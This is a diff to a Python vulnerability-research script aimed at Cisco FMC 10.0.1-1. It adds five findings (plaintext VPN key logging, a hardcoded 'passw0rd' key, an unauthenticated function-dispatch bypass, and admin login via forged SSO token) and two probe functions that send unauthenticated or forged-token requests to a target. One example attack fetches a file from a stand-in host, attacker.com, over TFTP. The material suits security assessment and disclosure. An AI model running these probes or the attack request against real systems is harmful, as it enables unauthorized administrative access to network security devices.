@@ -132,6 +132,41 @@ FMC-F11: SHA-1 Forbidden in FIPS 140-3 but Present in Auth Flow [MEDIUM]
   cwpass.xml uses SHA-1 for MICE credentials while FIPS 140-3 mode prohibits SHA-1.
   In FIPS mode, the SHA-1 cwpass.xml path may be blocked, but configuration-dependent.
   Admin password recovery path may use a code branch that bypasses FIPS enforcement.
+
+FMC-F12: IKE PSK Plaintext Exposure via toString() Debug Chain [MEDIUM]
+  hestia-vpn-shared.jar — PreSharedKeyPolicyBase.toString() appends "Key: " + sharedKey unmasked.
+  VpnBaseTopologyObject.toString() chains through all child policies.
+  Any debug log flush of VPN topology object writes all IKE PSKs in plaintext.
+  IKE_PSK_KEY_LENGTH_MIN = 1 — validator allows 1-character PSKs.
+  Impact: TAC support bundle or debug log -> all S2S VPN PSKs -> decrypt/hijack any managed IPsec tunnel.
+
+FMC-F13: Undocumented RADKit authorizations Endpoint [MEDIUM]
+  auth-daemon binary: "/api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/authorizations"
+  Second RADKit endpoint, undocumented in public API. Same RBAC domain as sudoaccess.
+  Alternate path for RADKit device authorization state enumeration and possible modification.
+
+FMC-F14: cs-psucli.jar SecurityHandler Hardcoded passw0rd AES Key — CCO Credential Exposure [MEDIUM]
+  com.cisco.nm.xms.vds.SecurityHandler: private static String passwordString = "passw0rd"
+  Used for SymmetricCrypto.encrypt/decrypt on stored Cisco.com (CCO) credentials.
+  Credential load path: ObjectInputStream.readObject() before decryption (deserialization risk if file writable).
+  Impact: filesystem read -> decrypt CCO creds using "passw0rd"; file write -> Java deserialization RCE.
+
+FMC-F15: PJB Handler On-Box Auth Bypass — Unauthenticated Arbitrary Function Dispatch [CRITICAL]
+  SF/Mojo/Handlers/PjbHandler.pm + SF/UI/PJB.pm — isAuthorized():
+  When isNGFWOnbox() == 1 (hardware FMC, /etc/sf/onbox.run exists, Aquila-class device):
+    - PjbHandler: session auth SKIPPED entirely
+    - isAuthorized: ALL permission checks bypassed; returns \&{$function} for any registered function
+  Attack: POST /pjb.cgi function=SF::UI::PJB::Health::AdvancedTroubleshooting::executeAsaCli
+          parameters=["<deviceId>","copy tftp://attacker.com/x disk0:/x"]
+  No credentials required. CLI whitelist: copy, delete, no, cluster, show, ping, traceroute, capture, clear, packet-tracer.
+  Impact: Unauthenticated FTD file write/config deletion on all managed devices (hardware FMC only).
+
+FMC-F16: ASDM Login Handler Hardcodes admin — SSO Token = Admin Session [HIGH]
+  SF/Mojo/Handlers/AsdmLoginHandler.pm handle_login_cgi():
+  SF::Auth::Login({ username => 'admin', password => $token, sso => 1, sensor_sso => 1, sso_token => $token })
+  Token validated via MD5 (F9 cross-reference: create_sso_token = MD5(base64url(new_kek))).
+  Any forged SSO token (via F9 entropy attack) logs in as admin — no admin password needed.
+  POST /asdmToken.cgi?sensor_sso=<forged_token> -> admin FMC session.
 """
 
 import base64
@@ -142,7 +177,7 @@ import json
 import re
 from typing import Optional
 
-VERSION = "1.1.0"
+VERSION = "1.2.0"
 TARGET = "Cisco FMC 10.0.1-1"
 
 
@@ -480,6 +515,61 @@ def probe_vault_chain_d(vault_key_path: str = "/etc/vault/admin") -> dict:
     return result
 
 
+# ── F15: PJB on-box auth bypass probe ─────────────────────────────────────────
+
+def probe_pjb_onbox_bypass(host: str, function: str = "SF::UI::PJB::ping",
+                           parameters: str = "[]", port: int = 443) -> dict:
+    """
+    F15: Probe PJB handler without session cookie.
+    If isNGFWOnbox() is true on the target, auth is bypassed and function executes.
+    Use 'SF::UI::PJB::ping' (requires 'all' permission) as baseline.
+    For impact demo: 'SF::UI::PJB::Health::AdvancedTroubleshooting::executeAsaCli'
+    with parameters='["<deviceId>","show version"]' — no creds needed.
+    """
+    url = f"https://{host}:{port}/pjb.cgi"
+    try:
+        r = requests.post(
+            url,
+            data={"function": function, "parameters": parameters},
+            verify=False,
+            timeout=10,
+        )
+        return {
+            "status": r.status_code,
+            "body": r.text[:500],
+            "finding": "FMC-F15",
+            "note": "200 without auth cookie = isNGFWOnbox bypass confirmed",
+        }
+    except Exception as e:
+        return {"error": str(e), "finding": "FMC-F15"}
+
+
+def probe_asdm_sso_login(host: str, token: str, port: int = 443) -> dict:
+    """
+    F16: Probe ASDM SSO login endpoint with a forged or captured SSO token.
+    If token is valid (or forgeable via F9 MD5), responds with session cookie as admin.
+    """
+    url = f"https://{host}:{port}/asdm/logon.html"
+    try:
+        r = requests.get(
+            url,
+            params={"sensor_sso": token},
+            verify=False,
+            allow_redirects=False,
+            timeout=10,
+        )
+        session_cookie = r.cookies.get("CGISESSID", "")
+        return {
+            "status": r.status_code,
+            "session_cookie": session_cookie,
+            "location": r.headers.get("Location", ""),
+            "finding": "FMC-F16",
+            "note": "200 + CGISESSID = admin session; 302 away = token invalid",
+        }
+    except Exception as e:
+        return {"error": str(e), "finding": "FMC-F16"}
+
+
 # ── Static analysis helpers ───────────────────────────────────────────────────
 
 def report_binary_pie_status(binary_path: str) -> dict:
@@ -612,6 +702,57 @@ def full_findings_summary() -> list[dict]:
             "cve": None,
             "version": "10.0.1-1",
             "details": "FIPS: crypto/sha1 not allowed; cwpass.xml uses SHA-1; behavior in FIPS mode TBD",
+        },
+        {
+            "id": "FMC-F12",
+            "severity": "MEDIUM",
+            "component": "hestia-vpn-shared.jar / IKE PSK",
+            "title": "IKE PSK written in plaintext via PreSharedKeyPolicyBase.toString()",
+            "cve": None,
+            "version": "10.0.1-1",
+            "jar": "hestia-vpn-shared.jar",
+            "details": "toString() appends 'Key: ' + sharedKey unmasked; VPN topology debug log leaks all PSKs",
+        },
+        {
+            "id": "FMC-F13",
+            "severity": "MEDIUM",
+            "component": "RADKit REST API (undocumented)",
+            "title": "Undocumented RADKit authorizations endpoint — alternate device-access enumeration",
+            "cve": None,
+            "version": "10.0.1-1",
+            "endpoint": "GET/PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/authorizations",
+            "details": "Undocumented endpoint in same RBAC domain as sudoaccess; not in public API docs",
+        },
+        {
+            "id": "FMC-F14",
+            "severity": "MEDIUM",
+            "component": "cs-psucli.jar / PSU SecurityHandler",
+            "title": "Hardcoded passw0rd AES key encrypts stored CCO credentials",
+            "cve": None,
+            "version": "10.0.1-1",
+            "jar": "cs-psucli.jar",
+            "details": "SecurityHandler.passwordString='passw0rd'; ObjectInputStream before decrypt = deserialization risk",
+        },
+        {
+            "id": "FMC-F15",
+            "severity": "CRITICAL",
+            "component": "PJB handler / on-box mode",
+            "title": "PJB handler skips auth+RBAC when isNGFWOnbox() — unauthenticated function dispatch",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/PjbHandler.pm + SF/UI/PJB.pm",
+            "details": "isNGFWOnbox(): session auth skipped + all FUNCTION_PERMISSIONS bypassed; any function callable",
+            "trigger": "hardware FMC (Aquila-class) with /etc/sf/onbox.run present",
+        },
+        {
+            "id": "FMC-F16",
+            "severity": "HIGH",
+            "component": "ASDM login / SSO",
+            "title": "AsdmLoginHandler hardcodes admin — forged SSO token = admin session",
+            "cve": None,
+            "version": "10.0.1-1",
+            "file": "sf/lib/perl/5.34.3/SF/Mojo/Handlers/AsdmLoginHandler.pm",
+            "details": "Login({ username=>'admin', password=>$token }); MD5 token (F9) -> admin FMC session",
         },
     ]
 
